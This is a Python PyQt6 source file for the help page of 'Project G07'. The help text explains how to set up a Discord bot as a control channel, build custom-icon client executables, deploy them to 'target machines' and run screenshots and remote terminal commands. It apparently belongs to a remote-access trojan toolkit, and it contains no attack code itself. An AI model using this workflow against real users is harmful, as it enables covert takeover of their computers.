from PyQt6.QtWidgets import (QWidget, QVBoxLayout, QLabel, QFrame, 
                              QScrollArea, QTextEdit)
from PyQt6.QtCore import Qt
from gui.styles import Styles

class HelpPage(QWidget):
    def __init__(self):
        super().__init__()
        self.init_ui()
    
    def init_ui(self):
        layout = QVBoxLayout(self)
        layout.setContentsMargins(40, 40, 40, 40)
        layout.setSpacing(30)
        
        title = QLabel("Help & Documentation")
        title.setStyleSheet(Styles.LABEL_TITLE)
        layout.addWidget(title)
        
        scroll = QScrollArea()
        scroll.setWidgetResizable(True)
        scroll.setStyleSheet("""
            QScrollArea {
                border: none;
                background: transparent;
            }
        """)
        
        content_widget = QWidget()
        content_layout = QVBoxLayout(content_widget)
        content_layout.setSpacing(20)
        
        sections = [
            ("Getting Started", """
<b>Welcome to Project G07!</b><br><br>

This tool allows you to remotely manage multiple Windows clients through Discord.<br><br>

<b>Quick Setup:</b><br>
1. Create a Discord bot at https://discord.com/developers/applications<br>
2. Enable Message Content Intent in the bot settings<br>
3. Invite the bot to your server with administrator permissions<br>
4. Create a channel named 'g07-control' in your Discord server<br>
5. Go to Settings and configure your bot token and guild ID<br>
6. Build your client executable in the Builder tab<br>
7. Deploy the client to target machines
"""),
            
            ("Using the Builder", """
<b>Build Custom Clients</b><br><br>

The Builder allows you to create custom client executables:<br><br>

<b>Required Fields:</b><br>
• <b>Client Name:</b> Name for the executable file<br>
• <b>Discord Guild ID:</b> Your Discord server ID (right-click server → Copy ID)<br>
• <b>Discord Bot Token:</b> Token from your bot application<br><br>

<b>Optional:</b><br>
• <b>Icon:</b> Custom .ico file for the executable<br><br>

Click "Build Client" and wait for the process to complete.<br>
The executable will be created in the G07-Build folder.
"""),
            
            ("Managing Clients", """
<b>Client Management</b><br><br>

The Clients tab shows all connected clients with:<br>
• <b>Status:</b> Online/Offline indicator<br>
• <b>PC Name:</b> Hostname of the client<br>
• <b>IP Address:</b> Client's IP address<br>
• <b>Region:</b> Geographic region (EU, US, etc.)<br>
• <b>Last Ping:</b> Time since last communication<br><br>

<b>Available Actions:</b><br>
• Screenshot - Capture client's screen<br>
• Open Terminal - Execute commands remotely<br>
• System Info - Get detailed system information<br>
• Shutdown - Shutdown the client<br>
• Restart - Restart the client<br><br>

Right-click any client or use the Actions button to access these features.
"""),
            
            ("Settings", """
<b>Configuration</b><br><br>

Configure your Project G07 installation:<br><br>

<b>Discord Settings:</b><br>
• <b>Bot Token:</b> Your Discord bot token<br>
• <b>Guild ID:</b> Your Discord server ID<br>
• <b>Control Channel:</b> Channel name for bot communication<br><br>

<b>Advanced Settings:</b><br>
• <b>Auto Refresh:</b> Automatic client list refresh interval<br>
• <b>Notifications:</b> Enable/disable desktop notifications<br>
• <b>Theme:</b> Customize the application appearance<br><br>

All settings are automatically saved to config.json
"""),
            
            ("Security Notes", """
<b>Important Security Information</b><br><br>

<b>Use Responsibly:</b><br>
• Only use on systems you own or have permission to access<br>
• Keep your bot token secure and never share it<br>
• Use strong passwords for your Discord account<br>
• Regularly update your bot token<br><br>

<b>Best Practices:</b><br>
• Enable 2FA on your Discord account<br>
• Restrict bot permissions to required channels<br>
• Monitor bot activity regularly<br>
• Keep logs of all actions performed<br><br>

<b>Legal Disclaimer:</b><br>
This tool is for educational and authorized administrative purposes only.
Unauthorized access to computer systems is illegal.
"""),
            
            ("Troubleshooting", """
<b>Common Issues</b><br><br>

<b>Clients not connecting:</b><br>
• Verify bot token and guild ID are correct<br>
• Ensure 'g07-control' channel exists<br>
• Check bot has proper permissions<br>
• Confirm Message Content Intent is enabled<br><br>

<b>Commands not working:</b><br>
• Check if client is online<br>
• Verify IP address is correct<br>
• Ensure both bots are in the same Discord server<br>
• Check Discord rate limits<br><br>

<b>Build failures:</b><br>
• Install required packages: PyInstaller, discord.py, Pillow<br>
• Check all fields are filled correctly<br>
• Ensure you have write permissions in the directory<br>
• Try running as administrator
""")
        ]
        
        for title_text, content_text in sections:
            section_frame = self.create_help_section(title_text, content_text)
            content_layout.addWidget(section_frame)
        
        content_layout.addStretch()
        scroll.setWidget(content_widget)
        layout.addWidget(scroll)
    
    def create_help_section(self, title, content):
        """Create a help section"""
        frame = QFrame()
        frame.setStyleSheet(Styles.CARD)
        
        layout = QVBoxLayout(frame)
        
        title_label = QLabel(title)
        title_label.setStyleSheet("""
            color: #00d4ff;
            font-size: 18px;
            font-weight: bold;
        """)
        layout.addWidget(title_label)
        
        content_label = QLabel(content)
        content_label.setStyleSheet("""
            color: #ffffff;
            font-size: 13px;
            line-height: 1.6;
        """)
        content_label.setWordWrap(True)
        content_label.setTextFormat(Qt.TextFormat.RichText)
        layout.addWidget(content_label)
        
        return frame
